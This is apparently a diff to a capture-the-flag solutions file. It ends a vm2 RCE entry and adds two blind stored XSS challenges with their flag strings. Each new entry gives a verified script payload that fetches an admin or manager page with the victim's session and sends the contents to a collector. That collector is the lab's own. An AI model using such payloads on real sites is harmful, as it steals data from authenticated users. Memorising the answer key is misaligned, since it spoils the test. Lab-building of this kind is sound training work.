@@ -163,3 +163,25 @@ machine.
 - In the shell: `cat /opt/aramoon/flag_reactoshell.txt`.
 - `/opt/aramoon/README_INTERNAL.txt` is a post-exploitation flavor/confirmation note that names the exact CVE (only readable after RCE, so it's not a pre-solve spoiler); `/opt/aramoon/notes.txt` is an unrelated decoy note (a Nabil/JWT-secret-rotation easter egg, cross-referencing challenge 16's `jwt-weak-secret`).
 - No naive keyword blacklist exists on the render endpoint in this version — the only barrier before the render API is the staff-role gate from step 1; the vm2 CVE itself is the entire "hard" part.
+
+### 22. IT Helpdesk blind stored XSS -> admin session hijack (flag19)
+- **Location:** `helpdesk6000-blind-xss` container, `/admin/flag`
+- **Content:** `CTF{BL1ND_XSS_H1J4CK5_TH3_4DM1N_B0T_0F_AR4M0n}`
+- Public ticket form (`POST /submit`) stores a ticket's `message` field verbatim. `/admin/tickets/<id>` (admin-only) renders it with Jinja2's `|safe` filter — the classic unescaped-render sink. A real headless-Chromium bot (`bot.py`), running in-process, cycles every ~20s: it logs into `/admin/login` with its own credentials (never exposed to players) and opens every open ticket, so injected JavaScript genuinely executes inside an authenticated admin browser session.
+- The admin session cookie is a normal HttpOnly Flask session cookie — reading `document.cookie` is a dead end by design. The intended path is a same-origin authenticated `fetch()` from the stored payload (rides the admin's session regardless of HttpOnly) against `/admin/flag`, exfiltrated to the app's own built-in mini-collector (`/collector/new` -> `/collector/<token>/hit` -> `/collector/<token>/log`) so no outbound internet egress is ever required.
+- Verified end-to-end payload (submitted as the ticket `message`, after creating a collector at `/collector/new`):
+  ```html
+  <script>fetch('/admin/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>
+  ```
+  Within one bot cycle (~20-40s), `/collector/<TOKEN>/log` shows the exfiltrated `{"flag": "CTF{BL1ND_XSS_H1J4CK5_TH3_4DM1N_B0T_0F_AR4M0n}"}`.
+
+### 23. Employee Kudos Wall blind stored XSS -> manager session hijack (flag20)
+- **Location:** `kudoswall5050-blind-xss` container, `/manager/secret-notes`
+- **Content:** `CTF{5T0R3D_XSS_1S_5T1LL_D4NG3R0U5_4_4R4M0N}`
+- Second, independently-solvable variant of challenge 22's pattern, reskinned as an HR moderation queue instead of a support-ticket queue. Public kudos posts (`POST /post`) sit in a pending-moderation list; `/manager/queue/<id>` (manager-only) previews a kudos card's `message` with `|safe` (in-fiction excuse: kudos cards support emoji/GIF embeds). A headless-Chromium bot plays the HR manager: it logs into `/manager/login` with its own credentials every ~20s and opens every pending kudos card.
+- Same exfil pattern as challenge 22: authenticated `fetch()` against `/manager/secret-notes`, exfiltrated to this app's own built-in mini-collector (`/collector/new` / `/collector/<token>/hit` / `/collector/<token>/log`), no outbound egress needed.
+- Verified end-to-end payload (submitted as the kudos `message`):
+  ```html
+  <script>fetch('/manager/secret-notes',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>
+  ```
+  `/collector/<TOKEN>/log` shows the exfiltrated `{"flag": "CTF{5T0R3D_XSS_1S_5T1LL_D4NG3R0U5_4_4R4M0N}"}` within one bot cycle.
